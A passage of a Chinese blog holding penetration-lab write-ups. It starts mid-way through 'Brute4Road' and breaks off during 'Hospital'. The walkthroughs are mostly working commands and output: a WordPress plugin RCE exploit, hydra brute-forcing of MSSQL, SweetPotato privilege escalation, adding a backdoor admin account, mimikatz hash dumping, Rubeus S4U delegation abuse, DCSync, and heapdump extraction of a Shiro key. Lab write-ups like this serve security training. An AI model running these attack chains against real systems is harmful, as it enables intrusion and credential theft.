Pass:123456 共享:[print$ IPC$]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-04-15 15:24:12] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-04-15 15:24:18] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扫到一堆哦一个一个看，172.22.2.18的80端口是一个wps，用wpscan扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wpcargo</span><br><span class="line"> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/</span><br><span class="line"> | Last Updated: 2024-08-08T17:00:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 7.0.6</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo &lt; 6.9.0 - Unauthenticated RCE</span><br><span class="line"> |     Fixed in: 6.9.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting</span><br><span class="line"> |     Fixed in: 6.9.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br></pre></td></tr></table></figure>

<p>存在wpcargo插件，有一个rce的漏洞<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# python3 2 -t &quot;http://172.22.2.18/&quot;</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># @author : biulove0x                      #</span><br><span class="line"># @name   : WP Plugins WPCargo Exploiter   #</span><br><span class="line"># @cve    : CVE-2021-25003                 #</span><br><span class="line">############################################</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png"></p>
<p>蚁剑连接，可以拿到数据库的密码</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png"></p>
<p>flag2在数据库里</p>
<h1 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h1><p>在另一张表里有很多密码</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png"></p>
<p>是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是<code>sa</code>，因为导出来的有空格，所以把前面的空格处理掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# grep -P &quot;\w+&quot; pass -o &gt;2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV</span><br><span class="line">[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC</span><br></pre></td></tr></table></figure>

<p>然后用MDUT连接</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png"></p>
<p>上传<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato?tab=readme-ov-file">sweetpotato.exe</a>然后提权</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png"></p>
<p>flag03在C:\Users\Administrator\flag\下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>

<h1 id="FLAG4"><a href="#FLAG4" class="headerlink" title="FLAG4"></a>FLAG4</h1><p>netstat -ano发现开启了3389</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加一个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;</span><br><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot;</span><br></pre></td></tr></table></figure>

<p>然后远程桌面登录</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png"></p>
<p>可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派</p>
<p>获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352</p>
<p>通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>

<p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]</span><br></pre></td></tr></table></figure>

<p>LDAP服务具有DCSync权限，可以导出域内用户哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure>

<p>得到域管的哈希为1a19251fbd935969832616366ae3fe62</p>
<p>然后就可以用WMI服务登录域控，flag在C:\Users\Administrator\flag下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/" class="post-title-link" itemprop="url">春秋云镜-Hospital</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-10 16:46:51 / 修改时间：19:05:01" itemprop="dateCreated datePublished" datetime="2025-04-10T16:46:51+08:00">2025-04-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>21k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>19 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>首先扫描一下端口，有一个22端口和8080端口，然后用fscan对这两个端口进行扫描，可以扫到一个heapdump泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">39.99.232.64:8080 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.232.64:8080  code:302 len:0      title:None 跳转url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD</span><br><span class="line">[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005   title:医疗管理后台</span><br><span class="line">[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">已完成 1/1</span><br><span class="line">[*] 扫描结束,耗时: 6.890674118s</span><br></pre></td></tr></table></figure>

<p>访问/actuator/heapdump，奖heapdump下载下了，然后用JDumpSpider分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF\heapdump via ☕ v17.0.11</span><br><span class="line">❯ java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br><span class="line">===========================================</span><br><span class="line">SpringDataSourceProperties</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">WeblogicDataSourceConnectionPoolConfig</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MongoClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AliDruidDataSourceWrapper</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">HikariDataSource</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">RedisStandaloneConfiguration</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JedisClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OriginTrackedMapPropertySource</span><br><span class="line">-------------</span><br><span class="line">management.endpoints.web.exposure.include = *</span><br><span class="line">server.port = 8080</span><br><span class="line">spring.thymeleaf.prefix = classpath:/templates/</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MutablePropertySources</span><br><span class="line">-------------</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">path.separator = :</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">os.version = 5.4.0-164-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">local.server.port = null</span><br><span class="line">user.country = US</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">user.home = /home/app</span><br><span class="line">user.language = en</span><br><span class="line">PID = 750</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">file.separator = /</span><br><span class="line">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">java.awt.headless = true</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MapPropertySources</span><br><span class="line">-------------</span><br><span class="line">local.server.port = null</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ConsulPropertySources</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JavaProperties</span><br><span class="line">-------------</span><br><span class="line">java.util.logging.FileHandler.pattern = %h/java%u.log</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">sun.arch.data.model = 64</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">security.overridePropertiesFile = true</span><br><span class="line">sun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64</span><br><span class="line">security.provider.7 = com.sun.security.sasl.Provider</span><br><span class="line">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">security.provider.9 = sun.security.smartcardio.SunPCSC</span><br><span class="line">java.specification.vendor = Oracle Corporation</span><br><span class="line">security.provider.1 = sun.security.provider.Sun</span><br><span class="line">security.provider.2 = sun.security.rsa.SunRsaSign</span><br><span class="line">security.provider.3 = sun.security.ec.SunEC</span><br><span class="line">networkaddress.cache.negative.ttl = 10</span><br><span class="line">security.provider.4 = com.sun.net.ssl.internal.ssl.Provider</span><br><span class="line">security.provider.5 = com.sun.crypto.provider.SunJCE</span><br><span class="line">security.provider.6 = sun.security.jgss.SunProvider</span><br><span class="line">file.separator = /</span><br><span class="line">org.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">org.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMapping</span><br><span class="line">org.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapter</span><br><span class="line">org.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManager</span><br><span class="line">package.definition = 